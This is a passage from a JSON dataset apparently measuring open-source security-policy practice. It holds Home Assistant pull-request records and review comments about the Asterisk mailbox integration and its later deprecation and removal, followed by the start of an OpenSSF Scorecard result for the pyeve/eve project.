                        "body": "Address comments and look how I do change the code and reopen after all is addressed",
                        "user": "pvizeli",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-04-17T11:00:34Z",
                        "url": "https://github.com/home-assistant/core/pull/11043#issuecomment-381948954"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/11043",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/8233",
                "title": "Add Initial Mailbox panel and sensor",
                "labels": [
                    "component",
                    "platform",
                    "requirement",
                    "new-platform",
                    "cla-signed",
                    "integration: asterisk_mbox"
                ],
                "user": "PhracturedBlue",
                "issue_author_association": "CONTRIBUTOR",
                "number": 8233,
                "id": 239179489,
                "state": "closed",
                "project_created_at": "2017-06-28T14:18:37Z",
                "closed_at": "2017-08-06T18:19:48Z",
                "body": "## Description:\r\nThis is a new panel and sensor that adds an interface to and Asterisk voice-mailbox\r\n\r\nThe panel allows viewing messages, reading a speech-to-text translation of the messages, listening to the messages, and deleting messages\r\n\r\nThe sensor shows how many messages are in the mailbox\r\n\r\n**Note**\r\nWhile the functionality is all in place, I am not fluent in working with asyncio.  I think I've fixed most of the data handlers now.\r\nI believe the MP3 handler should now properly load asynchronously\r\n\r\nI would really appreciate any code review, especially on the async aspects.\r\n\r\n**Pull request in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io) with documentation (if applicable):** home-assistant/home-assistant.github.io#2908\r\n\r\n**Pull request in [github.com/home-assistant/home-assistant-polymer) with frontend code change:** https://github.com/home-assistant/home-assistant-polymer/pull/319\r\n\r\n## Example entry for `configuration.yaml` (if applicable):\r\n```yaml\r\nasterisk_mbox:\r\n    password: This is my password\r\n    host: localhost\r\n    port: 12345\r\n```\r\n\r\n## Checklist:\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n  - [x] Documentation added/updated in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io)\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [x] Local tests with `tox` run successfully. **Your PR cannot be merged unless tests pass**\r\n  - [x] New dependencies have been added to the `REQUIREMENTS` variable ([example][ex-requir]).\r\n  - [x] New dependencies are only imported inside functions that use them ([example][ex-import]).\r\n  - [x] New dependencies have been added to `requirements_all.txt` by running `script/gen_requirements_all.py`.\r\n  - [x] New files were added to `.coveragerc`.\r\n\r\nIf the code does not interact with devices:\r\n  - [x] Local tests with `tox` run successfully. **Your PR cannot be merged unless tests pass**\r\n  - [x] Tests have been added to verify that the new code works.\r\n",
                "comments": [
                    {
                        "body": "I think I have addressed most of your concerns, but I do not understand this one:\r\n> set depencencies to http component\r\n\r\nCan you clarify your request please?",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-06-29T02:48:41Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-311847557"
                    },
                    {
                        "body": "He means that you should add `DEPENDENCIES = ['http']` so that the HTTP component is loaded before your component in initialized. (otherwise you can't register your view)",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-07-01T00:02:46Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-312396642"
                    },
                    {
                        "body": "I have completed all of the development now, have completed the frontend impelementation and documentation, so I'm moving this out of WIP.  I will of course still appreciate any feedback.",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-07-01T03:03:13Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-312406532"
                    },
                    {
                        "body": "I had a thought...Should I convert this into a generic 'mailbox' component?  The panel could easily be made a bit more generic and provide a list of any messages not just voicemail).",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-07-01T12:15:27Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-312428944"
                    },
                    {
                        "body": "Sorry for the delay responding to this PR. We've been busy wrapping up Hass.io.\r\n\r\nI like the idea of making it into a generic mailbox component. That makes it easier to justify shipping a panel to all our users. I do think that mailbox might not be the best name, maybe voicemail ? ",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-07-24T15:45:08Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-317464921"
                    },
                    {
                        "body": "I'll start work on the requested changes.  I called it 'mailbox' because there is very little inherent to voicemail in the panel (pretty much just the icon).  It could just as easily be email or twitter or list of camera photos, or whatever.  I thought that would make it more likely someone would devise an alternate backend.",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-07-25T02:45:53Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-317612818"
                    },
                    {
                        "body": "Okay, we can leave it as mailbox. ",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-07-26T03:44:31Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-317938959"
                    },
                    {
                        "body": "I have refactored the code now.  I would appreciate it if you could re-review to make sure the new structure is acceptable.  In the mean time, I am going to try to develop a demo component and then some tests for it.",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-07-27T02:19:31Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-318239308"
                    },
                    {
                        "body": "I reworked the mailbox to separate the entity from the platform object and removed the sensor.  I am not precisely sure if this is more aligned with what you were looking for though.",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-07-30T16:29:39Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-318912824"
                    },
                    {
                        "body": "Yes, the current architecture is great. ",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-08-02T06:09:19Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-319577221"
                    },
                    {
                        "body": "One thing I wasn't sure about was whether I was allowed to use a '@property' tag on the platform object.  the 'media_type' value is static (per platform) and it seemed excessive to use an coroutine to retrieve it.  I had only seen '@prperty' on entities though, so I wasn't sure it is ok.",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-08-03T15:17:34Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-320000528"
                    },
                    {
                        "body": "Yeah, properties are fine . If it's static it doesn't even have to be a property per se. Just this could work too:\r\n\r\n```python\r\nclass Bla:\r\n  media_type = 'something'\r\n```",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-08-06T18:08:47Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-320522702"
                    },
                    {
                        "body": "🎉  🐬  Awesome, great work!",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-08-06T18:19:59Z",
                        "url": "https://github.com/home-assistant/core/pull/8233#issuecomment-320523297"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/8233",
                    "merged_at": "2017-08-06T18:19:48Z"
                }
            }
        ],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 4,
        "num_security_issue_and_pull": 18,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/home-assistant/core/pull/123180",
                "title": "Remove deprecated asterisk_cdr integration",
                "labels": [
                    "core",
                    "breaking-change",
                    "remove-platform",
                    "cla-signed",
                    "small-pr",
                    "integration: asterisk_cdr",
                    "Quality Scale: No score"
                ],
                "user": "joostlek",
                "issue_author_association": "MEMBER",
                "number": 123180,
                "id": 2448190299,
                "state": "closed",
                "project_created_at": "2024-08-05T10:24:11Z",
                "closed_at": "2024-08-05T12:43:39Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nAsterisk_mbox has been deprecated in 2024.3.0 and has been removed\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nRemove deprecated asterisk_cdr integration\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [x] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [x] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [x] There is no commented out code in this PR.\r\n- [x] I have followed the [development checklist][dev-checklist]\r\n- [x] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [x] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/123180",
                    "merged_at": "2024-08-05T12:43:39Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/123174",
                "title": "Remove deprecated asterisk_mbox integration",
                "labels": [
                    "breaking-change",
                    "remove-platform",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr",
                    "Quality Scale: No score"
                ],
                "user": "joostlek",
                "issue_author_association": "MEMBER",
                "number": 123174,
                "id": 2448042707,
                "state": "closed",
                "project_created_at": "2024-08-05T09:17:26Z",
                "closed_at": "2024-08-05T13:28:50Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nAsterisk_mbox has been deprecated in 2024.3.0 and has been removed.\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nRemove deprecated asterisk_mbox integration\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [x] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: https://github.com/home-assistant/home-assistant.io/pull/34131\r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [x] The code change is tested and works locally.\r\n- [x] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [x] There is no commented out code in this PR.\r\n- [x] I have followed the [development checklist][dev-checklist]\r\n- [x] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [x] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [
                    {
                        "body": "<!-- ReviewDrafterComment -->\nPlease take a look at the requested changes, and use the **Ready for review** button when you are done, thanks :+1:\n\n[_Learn more about our pull request process._](https://developers.home-assistant.io/docs/review-process#prs-are-being-drafted-when-changes-are-needed)\n",
                        "user": "home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-08-05T09:57:05Z",
                        "url": "https://github.com/home-assistant/core/pull/123174#issuecomment-2268675505"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/123174",
                    "merged_at": "2024-08-05T13:28:50Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/110930",
                "title": "Deprecate mailbox platform",
                "labels": [
                    "core",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: mailbox",
                    "integration: asterisk_cdr",
                    "deprecation",
                    "Quality Scale: No score",
                    "Quality Scale: internal"
                ],
                "user": "edenhaus",
                "issue_author_association": "CONTRIBUTOR",
                "number": 110930,
                "id": 2141845395,
                "state": "closed",
                "project_created_at": "2024-02-19T08:55:08Z",
                "closed_at": "2024-02-27T12:50:02Z",
                "body": "<!--\r\n  You are amazing! Thanks for contributing to our project!\r\n  Please, DO NOT DELETE ANY TEXT from this template! (unless instructed).\r\n-->\r\n## Breaking change\r\n<!--\r\n  If your PR contains a breaking change for existing users, it is important\r\n  to tell them what breaks, how to make it work again and why we did this.\r\n  This piece of text is published with the release notes, so it helps if you\r\n  write it towards our users, not us.\r\n  Note: Remove this section if this PR is NOT a breaking change.\r\n-->\r\nDeprecate the mailbox integration platform and the asterisk integrations, as they only implement the mailbox platform.\r\n\r\nWe deprecate the mailbox integration because the mailbox platform is used only by the asterisk integrations, where asterix_cdr has 0 active installations and asterisk_mbox only 25. By removing the mailbox platform we can also remove the custom mailbox panel from the frontend.\r\n\r\n## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nWe deprecate the mailbox integration because the mailbox platform is used only by the asterisk integrations, where asterix_cdr has 0 active installations and asterisk_mbox only 25. By removing the mailbox platform we can also remove the custom mailbox panel from the frontend.\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [x] Deprecation (breaking change to happen in the future)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [ ] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: https://github.com/home-assistant/home-assistant.io/pull/31632\r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [ ] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [
                    {
                        "body": "I think we should add some context in the PR description why we remove the mailbox integration.",
                        "user": "MartinHjelmare",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T13:46:44Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1952488580"
                    },
                    {
                        "body": "<!-- ReviewDrafterComment -->\nPlease take a look at the requested changes, and use the **Ready for review** button when you are done, thanks :+1:\n\n[_Learn more about our pull request process._](https://developers.home-assistant.io/docs/review-process#prs-are-being-drafted-when-changes-are-needed)\n",
                        "user": "home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-27T07:28:58Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1965940309"
                    },
                    {
                        "body": "CI / Run tests Python 3.11 (7) (pull_request) :\r\n`FAILED tests/components/switcher_kis/test_init.py::test_update_fail - AssertionError: assert 'unavailable' != 'unavailable'` is unrelated",
                        "user": "edenhaus",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-27T12:49:31Z",
                        "url": "https://github.com/home-assistant/core/pull/110930#issuecomment-1966474507"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/110930",
                    "merged_at": "2024-02-27T12:50:02Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/106841",
                "title": "Enable strict typing for asterisk_cdr + asterisk_mbox",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: asterisk_cdr",
                    "code-quality",
                    "Quality Scale: No score"
                ],
                "user": "cdce8p",
                "issue_author_association": "MEMBER",
                "number": 106841,
                "id": 2061723033,
                "state": "closed",
                "project_created_at": "2024-01-01T19:09:00Z",
                "closed_at": "2024-01-01T19:45:16Z",
                "body": "## Proposed change\r\nImprove annotations and enable strict typing.\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Deprecation (breaking change to happen in the future)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [x] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] I have followed the [perfect PR recommendations][perfect-pr]\r\n- [ ] The code has been formatted using Ruff (`ruff format homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/development_checklist/\r\n[manifest-docs]: https://developers.home-assistant.io/docs/creating_integration_manifest/\r\n[quality-scale]: https://developers.home-assistant.io/docs/integration_quality_scale_index/\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n[perfect-pr]: https://developers.home-assistant.io/docs/review-process/#creating-the-perfect-pr\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/106841",
                    "merged_at": "2024-01-01T19:45:16Z"
                }
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 4,
        "has_generic_policy": true
    },
    {
        "project_name": "pyeve/eve",
        "project_url": "https://github.com/pyeve/eve",
        "SSF": {
            "date": "2024-10-29T23:07:37+07:00",
            "repo": {
                "name": "github.com/pyeve/eve",
                "commit": "172f3f251bc34d7c59cd72c9b67873b99ba0f486"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "1 out of 2 merged PRs checked by a CI test -- score normalized to 5",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
